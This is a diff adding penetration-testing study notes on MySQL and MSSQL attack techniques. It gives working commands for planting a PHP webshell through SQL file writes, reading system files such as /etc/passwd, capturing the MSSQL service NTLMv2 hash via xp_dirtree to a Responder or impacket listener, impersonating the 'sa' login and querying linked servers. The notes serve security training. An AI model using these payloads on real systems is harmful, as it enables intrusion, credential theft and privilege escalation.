@@ -765,4 +765,209 @@ GO
 **MySQL:** supports **User Defined Functions (UDFs):**
    - UDFs allow you to write custom functions in C/C++ and load them into MySQL. These functions can be executed within SQL queries, and in some cases, they can execute system commands. While rare in production environments due to security risks, they are an important capability to be aware of.
 
-#### Write Local Files
+### Write Local Files
+
+**MySQL:**
+- **Command Execution:**
+  - MySQL does not have a stored procedure like `xp_cmdshell`, but command execution can be achieved by writing to a location in the file system that can execute commands.
+  - For example, on a PHP-based web server:
+    ```sql
+    mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+    ```
+
+- **Secure File Privileges:**
+  - The global system variable `secure_file_priv` limits data import/export operations.
+  - Settings for `secure_file_priv`:
+    - **Empty:** No effect, not secure.
+    - **Directory Name:** Limits operations to files in that directory.
+    - **NULL:** Disables import/export operations.
+  - Example of checking `secure_file_priv`:
+    ```sql
+    mysql> show variables like "secure_file_priv";
+    
+    +------------------+-------+
+    | Variable_name    | Value |
+    +------------------+-------+
+    | secure_file_priv |       |
+    +------------------+-------+
+    1 row in set (0.005 sec)
+    ```
+
+**MSSQL:**
+- **Enable Ole Automation Procedures:**
+  - Requires admin privileges:
+    ```sql
+    1> sp_configure 'show advanced options', 1
+    2> GO
+    3> RECONFIGURE
+    4> GO
+    5> sp_configure 'Ole Automation Procedures', 1
+    6> GO
+    7> RECONFIGURE
+    8> GO
+    ```
+- **Create a File:**
+    ```sql
+    1> DECLARE @OLE INT
+    2> DECLARE @FileID INT
+    3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+    4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+    5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+    6> EXECUTE sp_OADestroy @FileID
+    7> EXECUTE sp_OADestroy @OLE
+    ```
+
+### Read Local Files
+
+**MSSQL:**
+- Allows reading any file to which the account has read access:
+  ```sql
+  1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+  2> GO
+  ```
+  Output example:
+  ```plaintext
+  BulkColumn
+  -----------------------------------------------------------------------------
+  # Copyright (c) 1993-2009 Microsoft Corp.
+  #
+  # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+  #
+  ```
+
+**MySQL:**
+- With appropriate settings and privileges:
+  ```sql
+  mysql> select LOAD_FILE("/etc/passwd");
+  
+  +--------------------------+
+  | LOAD_FILE("/etc/passwd")
+  +--------------------------------------------------+
+  root:x:0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+  bin:x:2:2:bin:/bin:/usr/sbin/nologin
+  sys:x:3:3:sys:/dev:/usr/sbin/nologin
+  sync:x:4:65534:sync:/bin:/bin/sync
+  ```
+
+### Capture MSSQL Service Hash
+
+- **Stealing Hash using `xp_subdirs` or `xp_dirtree`:**
+  - Use these stored procedures with the SMB protocol to retrieve a list of directories, forcing the server to authenticate and send the NTLMv2 hash.
+  - Example queries:
+    ```sql
+    1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
+    2> GO
+    ```
+    ```sql
+    1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
+    2> GO
+    ```
+
+- **Using Responder:**
+  ```bash
+  $ sudo responder -I tun0
+  ```
+  Output example:
+  ```plaintext
+  [SMB] NTLMv2-SSP Client   : 10.10.110.17
+  [SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
+  [SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
+  ```
+
+- **Using impacket-smbserver:**
+  ```bash
+  $ sudo impacket-smbserver share ./ -smb2support
+  ```
+  Output example:
+  ```plaintext
+  [*] Incoming connection (10.129.203.7,49728)
+  [*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
+  [*] User WINSRV02\mssqlsvc authenticated successfully                        
+  ```
+
+### Impersonate Existing Users with MSSQL
+
+**IMPERSONATE Permission:**
+- Allows a user to assume the permissions of another user.
+- Useful for testing permissions or for administrative tasks.
+
+**Steps to Impersonate a User:**
+1. **Identify Users:** Use a query to find users that you have the IMPERSONATE permission for.
+    ```sql
+    SELECT distinct b.name
+    FROM sys.server_permissions a
+    INNER JOIN sys.server_principals b
+    ON a.grantor_principal_id = b.principal_id
+    WHERE a.permission_name = 'IMPERSONATE'
+    ```
+
+2. **Verify Current User and Role:**
+    ```sql
+    SELECT SYSTEM_USER
+    SELECT IS_SRVROLEMEMBER('sysadmin')
+    ```
+
+3. **Impersonate a User:**
+    - Use the `EXECUTE AS LOGIN` statement to impersonate a specific user.
+    ```sql
+    EXECUTE AS LOGIN = 'sa'
+    SELECT SYSTEM_USER
+    SELECT IS_SRVROLEMEMBER('sysadmin')
+    ```
+
+4. **Revert to Previous User:**
+    - Use the `REVERT` statement to revert to the original user context.
+    ```sql
+    REVERT
+    ```
+
+**Important Notes:**
+- **Sysadmins:** By default, sysadmins can impersonate any user.
+- **Execution Context:** `EXECUTE AS LOGIN` should be run in the `master` database to avoid access issues.
+
+---
+
+### Communicate with Other Databases with MSSQL
+
+**Linked Servers:**
+- **Definition:** Configuration that allows SQL Server to execute commands on another SQL Server instance or different databases.
+- **Purpose:** Useful for integrating data from different sources and simplifying multi-database queries.
+
+**Identifying Linked Servers:**
+1. **Query to List Linked Servers:**
+    ```sql
+    SELECT srvname, isremote FROM sysservers
+    ```
+
+2. **Understanding Output:**
+    - `isremote` value of `1`: Indicates a remote server.
+    - `isremote` value of `0`: Indicates a linked server.
+
+3. **Example Output:**
+    ```plaintext
+    srvname                             isremote
+    ----------------------------------- --------
+    DESKTOP-MFERMN4\SQLEXPRESS          1
+    10.0.0.12\SQLEXPRESS                0
+    ```
+
+**Executing Queries on Linked Servers:**
+1. **Using EXECUTE Statement:**
+    - Send commands to a linked server using the `EXECUTE` statement.
+    ```sql
+    EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+    ```
+
+2. **Interpreting Results:**
+    - Verify the server name, SQL Server version, current user, and role membership.
+
+3. **Example Output:**
+    ```plaintext
+    ------------------------------ ------------------------------ ------------------------------ -----------
+    DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
+    ```
+
+**Additional Considerations:**
+- **Quotes in Queries:** Use double single quotes to escape single quotes when sending queries to linked servers.
+- **Multiple Commands:** Separate multiple commands with a semicolon `;`.
